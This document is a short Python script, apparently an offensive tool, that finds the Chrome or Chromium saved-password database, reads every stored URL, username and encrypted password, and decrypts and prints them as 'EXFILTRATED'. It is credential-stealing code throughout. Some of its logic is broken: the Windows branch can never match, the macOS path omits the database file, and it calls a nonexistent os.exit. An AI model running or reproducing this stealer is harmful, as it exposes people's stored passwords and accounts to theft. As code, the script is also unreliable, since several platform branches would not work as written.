#! /usr/bin/env python3
import os, sys, sqlite3
from platform import system
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

class exfil:
    def __init__(self):
        self.query = "SELECT action_url, username_value, password_value FROM logins"
        if len(sys.argv) < 2:
            self.current_system = system()
            match self.current_system[:4]:
                case "Darw":
                    self.saved_passwds_path = "/Users/%s/Library/Application Support/Google/Chrome/Default"%(os.getlogin())
                case "Windows":
                    self.saved_passwds_path = "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"%(os.getlogin())
                case "Linu":
                    self.saved_passwds_path = "/home/%s/.config/chromium/Default/Login Data"%(os.getlogin())
                case _:
                    print("[!] OS Not Detected!")
                    os.exit("[!] Error Occured")
        else:
            self.saved_passwds_path = sys.argv[1]
    
    def get_data(self):
        data = sqlite3.connect(self.saved_passwds_path)
        cursor = data.cursor()
        return cursor.execute(self.query)

    def dump(self, data):
        print("[+] Dumping: %s"%(data))
        data = data[3:]
        key = PBKDF2('peanuts'.encode('utf8'), b'saltysalt', 16, 1)
        print("[+] Found KEY: %s"%(key))
        passwd = AES.new(key, AES.MODE_CBC, IV=b' ' * 16).decrypt(data)
        try:
            return passwd[:-passwd[-1]].decode('utf-8')
        except:
            pass
test = exfil()
test.get_data()
for url, user, passwd in test.get_data():
    print("[+] EXFILTRATED: %s:%s:%s"%(url, user, test.dump(passwd)))
